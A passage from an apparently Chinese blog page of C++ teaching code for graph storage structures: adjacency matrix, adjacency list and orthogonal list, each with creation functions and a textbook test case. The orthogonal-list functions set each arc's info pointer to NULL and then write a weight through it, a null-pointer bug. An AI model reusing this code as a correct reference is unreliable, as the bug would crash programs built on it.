w);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateDN</span><span class="params">(MGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.vexs[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;G.vexnum; j++) G.arcs[i][j]= &#123; INF, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;v1, &amp;v2, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(G.arcs[v1][v2], w);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateUDG</span><span class="params">(MGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.vexs[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;G.vexnum; j++) G.arcs[i][j]= &#123; INF, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;v1, &amp;v2, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(G.arcs[v1][v2], w);</span><br><span class="line">        G.arcs[v2][v1]=G.arcs[v1][v2];</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateUDN</span><span class="params">(MGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.vexs[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;G.vexnum; j++) G.arcs[i][j]= &#123; INF, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;v1, &amp;v2, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(G.arcs[v1][v2], w);</span><br><span class="line">        G.arcs[v2][v1]=G.arcs[v1][v2];</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateGraph</span><span class="params">(MGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.kind);</span><br><span class="line">    <span class="keyword">switch</span>(G.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> DG: <span class="keyword">return</span> CreateDG(G);</span><br><span class="line">        <span class="keyword">case</span> DN: <span class="keyword">return</span> CreateDN(G);</span><br><span class="line">        <span class="keyword">case</span> UDG: <span class="keyword">return</span> CreateUDG(G);</span><br><span class="line">        <span class="keyword">case</span> UDN: <span class="keyword">return</span> CreateUDN(G);</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* p152 graph7.9</span></span><br><span class="line"><span class="comment">1 6 10 1</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5</span></span><br><span class="line"><span class="comment">0 1 5</span></span><br><span class="line"><span class="comment">0 3 7</span></span><br><span class="line"><span class="comment">1 2 4</span></span><br><span class="line"><span class="comment">2 0 8</span></span><br><span class="line"><span class="comment">2 5 9</span></span><br><span class="line"><span class="comment">3 2 5</span></span><br><span class="line"><span class="comment">3 5 6</span></span><br><span class="line"><span class="comment">4 3 5</span></span><br><span class="line"><span class="comment">5 0 3</span></span><br><span class="line"><span class="comment">5 4 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    MGraph G;</span><br><span class="line">    CreateGraph(G);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;G.vexnum; j++) <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, G.arcs[i][j].adj, <span class="string">" \n"</span>[j+<span class="number">1</span>==G.vexnum]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Status int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VRType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VertexType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123; DG, DN, UDG, UDN &#125; GraphKind;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;</span><br><span class="line">    ArcNode* nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    VertexType data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125; VNode, AdjList[MAX_VERTEX_NUM];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ALGraph</span> &#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="keyword">int</span> vexnum, arcnum;</span><br><span class="line">    <span class="keyword">int</span> kind;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVec</span><span class="params">(ALGraph &amp;G, <span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(VNode &amp;x, <span class="keyword">int</span> y, <span class="keyword">int</span> w, <span class="keyword">int</span> IncInfo)</span> </span>&#123;</span><br><span class="line">    ArcNode *t=<span class="keyword">new</span> ArcNode();</span><br><span class="line">    t-&gt;adjvex=y;</span><br><span class="line">    <span class="keyword">if</span>(IncInfo) t-&gt;info=<span class="keyword">new</span> <span class="keyword">int</span>(w);</span><br><span class="line">    t-&gt;nextarc=x.firstarc;</span><br><span class="line">    x.firstarc=t; x.data++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateDG</span><span class="params">(ALGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) G.vertices[i].firstarc=<span class="literal">NULL</span>, G.vertices[i].data=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        AddEdge(G.vertices[v1], v2, w, IncInfo);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateDN</span><span class="params">(ALGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) G.vertices[i].firstarc=<span class="literal">NULL</span>, G.vertices[i].data=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        AddEdge(G.vertices[v1], v2, w, IncInfo);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateUDG</span><span class="params">(ALGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) G.vertices[i].firstarc=<span class="literal">NULL</span>, G.vertices[i].data=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        AddEdge(G.vertices[v1], v2, w, IncInfo); AddEdge(G.vertices[v2], v1, w, IncInfo);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateUDN</span><span class="params">(ALGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) G.vertices[i].firstarc=<span class="literal">NULL</span>, G.vertices[i].data=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, w=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;w);</span><br><span class="line">        v1=LocateVec(G, v1), v2=LocateVec(G, v2);</span><br><span class="line">        AddEdge(G.vertices[v1], v2, w, IncInfo); AddEdge(G.vertices[v2], v1, w, IncInfo);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateGraph</span><span class="params">(ALGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.kind);</span><br><span class="line">    <span class="keyword">switch</span>(G.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> DG: <span class="keyword">return</span> CreateDG(G);</span><br><span class="line">        <span class="keyword">case</span> DN: <span class="keyword">return</span> CreateDN(G);</span><br><span class="line">        <span class="keyword">case</span> UDG: <span class="keyword">return</span> CreateUDG(G);</span><br><span class="line">        <span class="keyword">case</span> UDN: <span class="keyword">return</span> CreateUDN(G);</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* p152 graph7.9</span></span><br><span class="line"><span class="comment">1 6 10 1</span></span><br><span class="line"><span class="comment">0 1 5</span></span><br><span class="line"><span class="comment">0 3 7</span></span><br><span class="line"><span class="comment">1 2 4</span></span><br><span class="line"><span class="comment">2 0 8</span></span><br><span class="line"><span class="comment">2 5 9</span></span><br><span class="line"><span class="comment">3 2 5</span></span><br><span class="line"><span class="comment">3 5 6</span></span><br><span class="line"><span class="comment">4 3 5</span></span><br><span class="line"><span class="comment">5 0 3</span></span><br><span class="line"><span class="comment">5 4 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ALGraph G;</span><br><span class="line">    CreateGraph(G);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; G.vertices[i].data &lt;&lt; <span class="string">" :: -&gt; "</span>;</span><br><span class="line">        <span class="keyword">for</span>(ArcNode *j=G.vertices[i].firstarc; j; j=j-&gt;nextarc) <span class="built_in">cout</span> &lt;&lt; *(j-&gt;info) &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Status int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VertexType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123; DG, DN, UDG, UDN &#125; GraphKind;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArcBox</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> tailvex, headvex;</span><br><span class="line">    ArcBox *hlink, *tlink;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VexNode</span> &#123;</span></span><br><span class="line">    VertexType data;</span><br><span class="line">    ArcBox *firstin, *firstout;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OLGraph</span> &#123;</span></span><br><span class="line">    VexNode xlist[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="keyword">int</span> vexnum, arcnum;</span><br><span class="line">    <span class="keyword">int</span> kind;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVec</span><span class="params">(OLGraph &amp;G, <span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Input</span><span class="params">(InfoType &amp;x)</span> </span>&#123; <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x); &#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateDG</span><span class="params">(OLGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.xlist[i].data);</span><br><span class="line">        G.xlist[i].firstin=<span class="literal">NULL</span>, G.xlist[i].firstout=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        v1=LocateVec(G, v1); v2=LocateVec(G, v2);</span><br><span class="line">        ArcBox *p=(ArcBox *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcBox));</span><br><span class="line">        *p=&#123;v1, v2, G.xlist[v2].firstin, G.xlist[v1].firstout, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        G.xlist[v2].firstin=G.xlist[v1].firstout=p;</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(*p-&gt;info);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateDN</span><span class="params">(OLGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.xlist[i].data);</span><br><span class="line">        G.xlist[i].firstin=<span class="literal">NULL</span>, G.xlist[i].firstout=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        v1=LocateVec(G, v1); v2=LocateVec(G, v2);</span><br><span class="line">        ArcBox *p=(ArcBox *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcBox));</span><br><span class="line">        *p=&#123;v1, v2, G.xlist[v2].firstin, G.xlist[v1].firstout, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        G.xlist[v2].firstin=G.xlist[v1].firstout=p;</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(*p-&gt;info);</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateUDG</span><span class="params">(OLGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.xlist[i].data);</span><br><span class="line">        G.xlist[i].firstin=<span class="literal">NULL</span>, G.xlist[i].firstout=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        v1=LocateVec(G, v1); v2=LocateVec(G, v2);</span><br><span class="line">        ArcBox *p=(ArcBox *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcBox));</span><br><span class="line">        *p=&#123;v1, v2, G.xlist[v2].firstin, G.xlist[v1].firstout, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        